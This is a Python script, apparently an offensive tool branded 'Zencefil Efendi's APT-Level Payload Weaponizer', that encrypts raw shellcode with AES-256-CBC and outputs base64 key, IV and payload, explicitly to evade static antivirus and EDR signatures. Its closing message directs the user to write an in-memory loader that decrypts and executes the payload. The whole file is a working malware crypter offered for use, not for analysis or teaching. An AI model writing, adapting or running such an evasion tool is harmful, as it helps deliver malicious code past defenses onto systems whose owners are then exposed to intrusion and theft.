#!/usr/bin/env python3
# ==============================================================================
# 🍯 Zencefil Efendi's APT-Level Payload Weaponizer
# Description: Encrypts raw payloads (AES-256) to bypass static AV/EDR signatures.
# ==============================================================================

import os
import base64
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def pad(data):
    padding_length = 16 - (len(data) % 16)
    return data + bytes([padding_length] * padding_length)

def encrypt_payload(payload_bytes, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padded_data = pad(payload_bytes)
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return ciphertext

def main():
    parser = argparse.ArgumentParser(description="🍯 Zencefil Efendi's Payload Obfuscator")
    parser.add_argument("-i", "--input", required=True, help="Raw shellcode/payload file (e.g., payload.bin)")
    parser.add_argument("-o", "--output", required=True, help="Output file for obfuscated payload (e.g., evil.txt)")
    args = parser.parse_args()

    try:
        with open(args.input, 'rb') as f:
            raw_payload = f.read()
    except FileNotFoundError:
        print(f"[!] Error: File {args.input} not found.")
        return

    # Generate random 32-byte key (AES-256) and 16-byte IV
    key = os.urandom(32)
    iv = os.urandom(16)

    # Encrypt the payload
    encrypted_payload = encrypt_payload(raw_payload, key, iv)

    # Encode to base64 for easy transport
    b64_cipher = base64.b64encode(encrypted_payload).decode('utf-8')
    b64_key = base64.b64encode(key).decode('utf-8')
    b64_iv = base64.b64encode(iv).decode('utf-8')

    with open(args.output, 'w') as f:
        f.write(f"KEY: {b64_key}\n")
        f.write(f"IV: {b64_iv}\n")
        f.write(f"PAYLOAD: {b64_cipher}\n")

    print("==================================================")
    print("🍯 Zencefil Weaponizer - EDR Bypass Prep Complete")
    print("==================================================")
    print(f"[+] Encrypted with AES-256 CBC")
    print(f"[+] Output saved to {args.output}")
    print("[!] Write a memory-loader (C#/Nim) to decode and execute this in-memory.")

if __name__ == "__main__":
    main()
